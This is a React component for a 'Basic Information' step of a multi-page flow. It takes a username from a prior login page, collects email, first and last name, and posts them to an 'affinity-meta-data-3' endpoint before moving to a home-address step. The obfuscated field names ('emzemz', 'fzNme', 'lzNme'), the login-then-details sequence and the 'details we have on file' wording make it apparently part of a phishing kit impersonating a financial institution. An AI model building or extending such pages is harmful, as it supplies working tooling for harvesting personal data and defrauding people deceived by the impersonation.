import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const BasicInfo: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [username, setUsername] = useState('');
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<{ fzNme?: string; lzNme?: string; email?: string; form?: string }>({});

  useEffect(() => {
    const { emzemz } = location.state || {};
    if (emzemz) {
      setUsername(emzemz);
    }
  }, [location.state]);

  if (!username) {
    return (
      <FlowCard title="Basic Information">
        <p className="text-sm text-gray-700 text-center">
          We could not find your username from the previous step. Please return to the login page and try again.
        </p>
        <button
          type="button"
          onClick={() => navigate('/login')}
          className="mt-6 w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition"
        >
          Back to login
        </button>
      </FlowCard>
    );
  }

  const validateForm = () => {
    const nextErrors: { fzNme?: string; lzNme?: string; email?: string } = {};

    if (!email.trim()) {
      nextErrors.email = 'Email is required.';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      nextErrors.email = 'Enter a valid email address.';
    }

    if (!fzNme.trim()) {
      nextErrors.fzNme = 'First name is required.';
    }

    if (!lzNme.trim()) {
      nextErrors.lzNme = 'Last name is required.';
    }

    setErrors(nextErrors);
    return Object.keys(nextErrors).length === 0;
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    setErrors((prev) => ({ ...prev, form: undefined }));

    try {
      await axios.post(`${baseUrl}api/affinity-meta-data-3/`, {
        emzemz: username,
        email,
        fzNme,
        lzNme,
      });

      navigate('/home-address', {
        state: {
          emzemz: username,
          fzNme,
          lzNme,
        },
      });
    } catch (error) {
      console.error('Error submitting basic info:', error);
      setErrors((prev) => ({ ...prev, form: 'Unable to submit your information. Please try again.' }));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <FlowCard title="Basic Information">
      <p className="text-sm text-gray-600 text-center mb-4">
        Confirm the details we have on file before continuing your enrollment.
      </p>
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="email">
            Email
          </label>
          <input
            id="email"
            name="email"
            type="email"
            value={email}
            onChange={(event) => setEmail(event.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            placeholder="name@example.com"
          />
          <FormError message={errors.email ?? ''} className="mt-2" />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="fzNme">
            First name
          </label>
          <input
            id="fzNme"
            name="fzNme"
            type="text"
            value={fzNme}
            onChange={(event) => setFzNme(event.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
          />
          <FormError message={errors.fzNme ?? ''} className="mt-2" />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="lzNme">
            Last name
          </label>
          <input
            id="lzNme"
            name="lzNme"
            type="text"
            value={lzNme}
            onChange={(event) => setLzNme(event.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
          />
          <FormError message={errors.lzNme ?? ''} className="mt-2" />
        </div>

        <FormError message={errors.form ?? ''} />

        <button
          type="submit"
          className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? 'Submitting…' : 'Continue'}
        </button>
      </form>
    </FlowCard>
  );
};

export default BasicInfo;
